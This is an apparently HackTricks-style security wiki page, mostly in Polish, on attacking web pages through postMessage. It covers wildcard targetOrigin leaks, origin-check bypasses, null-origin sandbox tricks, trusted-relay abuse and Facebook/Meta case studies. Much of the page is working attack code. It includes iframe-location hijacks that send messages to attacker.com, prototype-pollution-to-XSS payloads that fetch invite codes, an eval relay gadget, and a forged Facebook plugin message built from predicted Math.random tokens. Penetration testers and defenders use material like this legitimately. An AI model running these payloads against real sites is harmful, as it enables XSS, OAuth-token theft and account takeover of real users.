# Luki w PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Wysyłanie **PostMessage**

**PostMessage** używa następującej funkcji do wysyłania wiadomości:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
W **drugim scenariuszu**, **wiadomość może być wysłana tylko do tej domeny** (nawet jeśli origin obiektu Window jest inny).\
Jeśli użyty jest **wildcard**, **wiadomości mogą być wysyłane do dowolnej domeny**, i będą wysyłane do origin obiektu Window.

### Atak na iframe & wildcard w **targetOrigin**

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) jeśli znajdziesz stronę, którą można **iframed** (no `X-Frame-Header` protection) i która **wysyła poufną** wiadomość za pomocą **postMessage** używając **wildcard** (\*), możesz **zmodyfikować** **origin** **iframe** i **leak** **poufnej** wiadomości do domeny kontrolowanej przez Ciebie.\
Zwróć uwagę, że jeśli strona może być iframed, ale **targetOrigin** jest **ustawiony na URL, a nie na wildcard**, ta **sztuczka nie zadziała**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Eksploatacja addEventListener

**`addEventListener`** to funkcja używana przez JS do zadeklarowania funkcji, która oczekuje `postMessages`.\  
Użyty zostanie kod podobny do poniższego:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Zwróć uwagę, że w tym przypadku **pierwszą rzeczą**, którą robi kod, jest **sprawdzenie origin**. To jest niezwykle **ważne**, szczególnie jeśli strona ma zamiar zrobić **cokolwiek wrażliwego** z otrzymanymi danymi (np. zmienić hasło). **Jeżeli nie sprawdza origin, atakujący mogą sprawić, że ofiary wyślą dowolne dane do tych endpoints** i zmienić hasła ofiar (w tym przykładzie).

### Enumeration

W celu **znalezienia event listenerów** na bieżącej stronie możesz:

- **Przeszukać** kod JS pod kątem `window.addEventListener` i `$(window).on` (_JQuery version_)
- **Wykonać** w konsoli narzędzi developerskich: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Przejść do** _Elements --> Event Listeners_ w narzędziach developerskich przeglądarki

![](<../../images/image (396).png>)

- Użyć **rozszerzenia przeglądarki** jak [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) lub [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Te rozszerzenia **przechwycą wszystkie wiadomości** i pokażą je Tobie.

### Origin check bypasses

- **`event.isTrusted`** atrybut jest uważany za bezpieczny, ponieważ zwraca `True` tylko dla zdarzeń wygenerowanych przez rzeczywiste akcje użytkownika. Choć jest trudny do obejścia przy poprawnej implementacji, jego znaczenie w kontrolach bezpieczeństwa jest istotne.
- Użycie **`indexOf()`** do walidacji origin w zdarzeniach PostMessage może być podatne na ominięcie. Przykład ilustrujący tę podatność:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Metoda **`search()`** z `String.prototype.search()` jest przeznaczona dla wyrażeń regularnych, nie dla stringów. Przekazanie czegokolwiek innego niż regexp prowadzi do niejawnej konwersji na regex, co może uczynić metodę niebezpieczną. W regexie kropka (.) działa jako wildcard, pozwalając obejść walidację przy specjalnie spreparowanych domenach. Na przykład:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Funkcja **`match()`**, podobnie jak `search()`, obsługuje regex. Jeśli regex jest źle skonstruowany, może być podatny na obejścia.
- Funkcja **`escapeHtml`** ma na celu sanitację wejścia przez escape’owanie znaków. Jednak nie tworzy nowego obiektu z escaped wartościami, lecz nadpisuje właściwości istniejącego obiektu. To zachowanie może być wykorzystane. W szczególności, jeśli obiekt może zostać zmanipulowany tak, że jego kontrolowana właściwość nie ujawnia `hasOwnProperty`, `escapeHtml` nie zadziała zgodnie z oczekiwaniem. Demonstruje to poniższy przykład:

- Oczekowana porażka:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Obejście escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

W kontekście tej podatności obiekt `File` jest szczególnie podatny z powodu swojej tylko-do-odczytu właściwości `name`. Ta właściwość, używana w szablonach, nie jest sanitizowana przez `escapeHtml`, co prowadzi do potencjalnych zagrożeń bezpieczeństwa.

- Właściwość `document.domain` w JavaScript może być ustawiona przez skrypt w celu skrócenia domeny, co pozwala na bardziej liberalne egzekwowanie same-origin policy w ramach tej samej domeny nadrzędnej.

### Origin-only trust + trusted relays

Jeśli odbiorca sprawdza tylko **`event.origin`** (np. ufa wszystkim `*.trusted.com`), często można znaleźć **"relay" page na tym origin, która odsyła parametry kontrolowane przez atakującego przez `postMessage`** do podanego `targetOrigin`/`targetWindow`. Przykłady to gadżety marketingowe/analytczne, które pobierają query params i przekazują `{msg_type, access_token, ...}` do `opener`/`parent`. Możesz:

- **Otworzyć stronę ofiary w popupie/iframe, który ma `opener`**, aby jego handlery się zarejestrowały (wiele pixels/SDKs przypina listenery tylko wtedy, gdy `window.opener` istnieje).
- **Nawigować inne okno atakującego do relay endpointu na zaufanym origin**, wypełniając pola wiadomości, które chcesz wstrzyknąć (typ wiadomości, tokeny, nonces).
- Ponieważ wiadomość teraz pochodzi **z zaufanego origin**, walidacja oparta tylko na origin przechodzi i możesz wywołać uprzywilejowane zachowania (zmiany stanu, wywołania API, zapisy w DOM) w listenerze ofiary.

Wzorce nadużyć obserwowane w terenie:

- SDKs analityczne (np. pixel/fbevents-style) konsumują wiadomości typu `FACEBOOK_IWL_BOOTSTRAP`, a następnie **wywołują backendowe API używając tokena dostarczonego w wiadomości** i dołączają **`location.href` / `document.referrer`** w ciele żądania. Jeśli dostarczysz własny token, możesz **przejrzeć te żądania w historii/logach żądań tokena** i exfil OAuth codes/tokens obecne w URL/referrer strony ofiary.
- Każdy relay, który odzwierciedla dowolne pola do `postMessage`, pozwala **podszyć się pod typy wiadomości** oczekiwane przez uprzywilejowane listenery. Połącz to ze słabą walidacją wejścia, aby dotrzeć do wywołań Graph/REST, odblokowań funkcji lub przepływów równoważnych CSRF.

Wskazówki do polowania: wyenumeruj `postMessage` listenery, które sprawdzają tylko `event.origin`, następnie poszukaj **same-origin HTML/JS endpointów, które przekazują parametry URL przez `postMessage`** (marketing previews, login popups, OAuth error pages). Połącz oba kroki za pomocą `window.open()` + `postMessage`, aby obejść sprawdzanie origin.

### e.origin == window.origin bypass

Podczas osadzania strony w **sandboxed iframe** używając %%%%%%, ważne jest zrozumienie, że origin iframe zostanie ustawiony na null. Ma to szczególne znaczenie przy pracy z **sandbox attributes** i ich wpływem na bezpieczeństwo i funkcjonalność.

Określając **`allow-popups`** w atrybucie sandbox, każde okno popup otwarte z wnętrza iframe dziedziczy ograniczenia sandbox rodzica. Oznacza to, że chyba że dołączony jest także atrybut **`allow-popups-to-escape-sandbox`**, origin popupu również zostanie ustawiony na `null`, zgodnie z origin iframe.

W konsekwencji, jeśli popup zostanie otwarty w takich warunkach i wiadomość zostanie wysłana z iframe do popupu za pomocą **`postMessage`**, obie strony — nadawcza i odbiorcza — będą miały origin ustawiony na `null`. To prowadzi do sytuacji, w której **`e.origin == window.origin`** oceni się jako true (`null == null`), ponieważ zarówno iframe, jak i popup mają tę samą wartość origin `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Możliwe jest sprawdzenie, czy wiadomość pochodziła z tego samego okna, w którym skrypt nasłuchuje (szczególnie interesujące dla **Content Scripts from browser extensions**, aby sprawdzić, czy wiadomość została wysłana z tej samej strony):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Możesz wymusić, aby **`e.source`** wiadomości było null, tworząc **iframe**, który **wysyła** **postMessage** i jest **natychmiast usuwany**.

Aby uzyskać więcej informacji **przeczytaj:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Aby przeprowadzić te ataki najlepiej będziesz mógł **umieścić stronę ofiary** wewnątrz `iframe`. Jednak niektóre nagłówki, jak `X-Frame-Header`, mogą **uniemożliwić** to **zachowanie**.\
W takich scenariuszach możesz nadal użyć mniej dyskretnego ataku. Możesz otworzyć nową kartę prowadzącą do podatnej aplikacji webowej i komunikować się z nią:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Stealing message sent to child by blocking the main page

Na poniższej stronie możesz zobaczyć, jak można wykraść **wrażliwe postmessage dane** wysłane do **child iframe** poprzez **zablokowanie** **main** page przed wysłaniem danych i wykorzystanie **XSS in the child**, aby **leak the data** zanim zostaną odebrane:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Stealing message by modifying iframe location

Jeśli możesz osadzić stronę jako iframe bez X-Frame-Header, która zawiera inny iframe, możesz **change the location of that child iframe**, więc jeśli odbiera **postmessage** wysyłane z użyciem **wildcard**, atakujący może **change** **origin** tego iframe na stronę **controlled** przez niego i **steal** wiadomość:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

W scenariuszach, gdzie dane wysyłane przez `postMessage` są wykonywane przez JS, możesz osadzić stronę w **iframe** i wykorzystać **prototype pollution/XSS**, wysyłając exploit przez `postMessage`.

Kilka bardzo dobrze wyjaśnionych XSS przez `postMessage` można znaleźć pod adresem [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Przykład exploita wykorzystującego **Prototype Pollution** a następnie **XSS** przez `postMessage` do `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Dla **więcej informacji**:

- Link do strony o [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link do strony o [**XSS**](../xss-cross-site-scripting/index.html)
- Link do strony o [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Origin-derived script loading & supply-chain pivot (studium przypadku CAPIG)

`capig-events.js` only registered a `message` handler when `window.opener` existed. On `IWL_BOOTSTRAP` it checked `pixel_id` but stored `event.origin` and later used it to build `${host}/sdk/${pixel_id}/iwl.js`.

<details>
<summary>Handler zapisujący origin kontrolowany przez atakującego</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Uzyskaj opener: np. w Facebook Android WebView ponownie użyj `window.name` z `window.open(target, name)`, tak aby okno stało się swoim własnym openerem, a następnie wyślij postMessage z złośliwego iframe.
2. Wyślij `IWL_BOOTSTRAP` z dowolnego origin, aby zapisać `host = event.origin` w `localStorage`.
3. Hostuj `/sdk/<pixel_id>/iwl.js` na dowolnym originie dozwolonym przez CSP (takeover/XSS/upload na białej liście domen analitycznych). `startIWL()` załaduje wtedy attacker JS na stronie osadzającej (np. `www.meta.com`), umożliwiając uwierzytelnione wywołania cross-origin i przejęcie konta.

Jeśli bezpośrednia kontrola openera była niemożliwa, kompromitacja iframe strony trzeciej wciąż pozwalała wysłać spreparowany `postMessage` do parenta, aby zatruć przechowywany host i wymusić załadowanie skryptu.

**Backend-generated shared script → stored XSS:** plugin `AHPixelIWLParametersPlugin` konkatenował parametry reguł użytkownika do JS dopisywanego do `capig-events.js` (np. `cbq.config.set(...)`). Wstrzyknięcie breakoutu typu `"]}` powodowało wykonanie dowolnego JS, tworząc stored XSS w udostępnionym skrypcie serwowanym do wszystkich stron, które go ładowały.

### Trusted-origin allowlist isn't a boundary

Surowa kontrola `event.origin` działa tylko wtedy, gdy **zaufany origin nie może uruchamiać złośliwego JS**. Kiedy uprzywilejowane strony osadzają iframe stron trzecich i zakładają, że `event.origin === "https://partner.com"` jest bezpieczne, każde XSS w `partner.com` staje się mostem do parenta:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Wzorzec ataku zaobserwowany w praktyce:

1. **Exploit XSS in the partner iframe** i umieść relay gadget, dzięki czemu każde `postMessage` staje się code exec wewnątrz trusted origin:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **From the attacker page**, wyślij JS do przejętego iframe, który przesyła z powrotem do rodzica dozwolony typ wiadomości. Wiadomość pochodzi z `partner.com`, przechodzi allowlist i zawiera HTML, który jest wstawiany w sposób niebezpieczny:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Rodzic wstrzykuje HTML atakującego, dając **wykonanie JS w parent origin** (np. `facebook.com`), które można wykorzystać do kradzieży kodów OAuth lub eskalacji do pełnego przejęcia konta.

Key takeaways:

- **Partner origin isn't a boundary**: każde XSS u „zaufanego” partnera pozwala atakującym wysyłać dozwolone wiadomości omijające sprawdzenia `event.origin`.
- Handlery, które **renderują partner-controlled payloads** (np. `innerHTML` dla określonych typów wiadomości), czynią kompromis partnera same-origin DOM XSS.
- Szeroka **message surface** (wiele typów, brak walidacji struktury) daje więcej gadgetów do pivotowania po kompromisie iframe partnera.

### Przewidywanie **`Math.random()`** callback tokens w postMessage bridges

Gdy walidacja wiadomości używa „shared secret” generowanego przez `Math.random()` (np. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) i ten sam helper nazywa też plugin iframes, możesz odzyskać PRNG outputs i sfałszować zaufane wiadomości:

- **Leak PRNG outputs via `window.name`:** SDK automatycznie nadaje nazwy plugin iframes za pomocą `guid()`. Jeśli kontrolujesz top frame, umieść stronę ofiary w iframe, potem przekieruj plugin iframe do swojego originu (np. `window.frames[0].frames[0].location='https://attacker.com'`) i odczytaj `window.frames[0].frames[0].name`, aby uzyskać surowe wyjście `Math.random()`.
- **Force more outputs without reloads:** Niektóre SDK udostępniają ścieżkę reinit; w FB SDK wywołanie `init:post` z `{xfbml:1}` wymusza `XFBML.parse()`, niszczy/odtwarza plugin iframe i generuje nowe nazwy/ID callbacków. Powtarzane reinit daje tyle wyjść PRNG, ile potrzeba (uwaga: dodatkowe wewnętrzne wywołania `Math.random()` dla ID callback/iframe, więc solvery muszą pominąć wartości pośrednie).
- **Trusted-origin delivery via parameter pollution:** Jeśli endpoint first-party pluginu odzwierciedla niezsanityzowany parametr w cross-window payload (np. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), możesz wstrzyknąć `&type=...&iconSVG=...` zachowując zaufany origin `facebook.com`.
- **Predict the next callback:** Konwertuj leaked nazwy iframe z powrotem na floats w `[0,1)` i podaj kilka wartości (nawet niekolejnych) do predyktora `Math.random` V8 (np. opartego na Z3). Wygeneruj następne `guid()` lokalnie, aby sfałszować oczekiwany token callback.
- **Trigger the sink:** Przygotuj dane postMessage tak, aby bridge dispatchował `xd.mpn.setupIconIframe` i wstrzykiwał HTML w `iconSVG` (np. URL-encoded `<img src=x onerror=...>`), osiągając DOM XSS wewnątrz hostującego originu; stamtąd można odczytać same-origin iframes (OAuth dialogs, arbiters itp.).
- **Framing quirks help:** Łańcuch wymaga framingu. W niektórych mobile webviews `X-Frame-Options` może degradować do nieobsługiwanego `ALLOW-FROM`, gdy obecne jest `frame-ancestors`, a parametry „compat” mogą wymusić permisywne `frame-ancestors`, umożliwiając side channel `window.name`.

#### Minimalny przykład sfałszowanej wiadomości
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Źródła

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Do ćwiczeń: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
